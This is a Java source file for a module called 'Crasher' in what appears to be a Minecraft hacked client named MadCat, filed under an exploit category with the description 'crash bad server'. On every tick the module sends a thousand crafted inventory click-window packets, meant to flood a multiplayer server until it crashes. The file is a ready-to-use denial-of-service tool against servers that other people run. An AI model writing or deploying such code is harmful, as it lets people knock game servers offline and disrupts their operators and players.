package me.madcat.features.modules.exploit;

import me.madcat.MadCat;
import me.madcat.features.modules.Module;
import me.madcat.features.setting.Setting;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.util.EnumHand;

public class Crasher
extends Module {
    private final Setting<Boolean> escoff = this.register(new Setting<>("EscOff", true));

    @Override
    public void onLogin() {
        if (this.escoff.getValue() && MadCat.moduleManager.isModuleEnabled("Crasher")) {
            this.disable();
        }
    }

    public Crasher() {
        super("Crasher", "crash bad server", Module.Category.EXPLOIT);
    }

    @Override
    public void onLogout() {
        if (this.escoff.getValue() && MadCat.moduleManager.isModuleEnabled("Crasher")) {
            this.disable();
        }
    }

    @Override
    public void onTick() {
        for (int i = 0; i < 1000; ++i) {
            ItemStack itemStack = new ItemStack(Crasher.mc.player.getHeldItem(EnumHand.MAIN_HAND).getItem());
            CPacketClickWindow cPacketClickWindow = new CPacketClickWindow(0, 69, 1, ClickType.QUICK_MOVE, itemStack, (short) 1);
            Crasher.mc.player.connection.sendPacket(cPacketClickWindow);
        }
    }
}

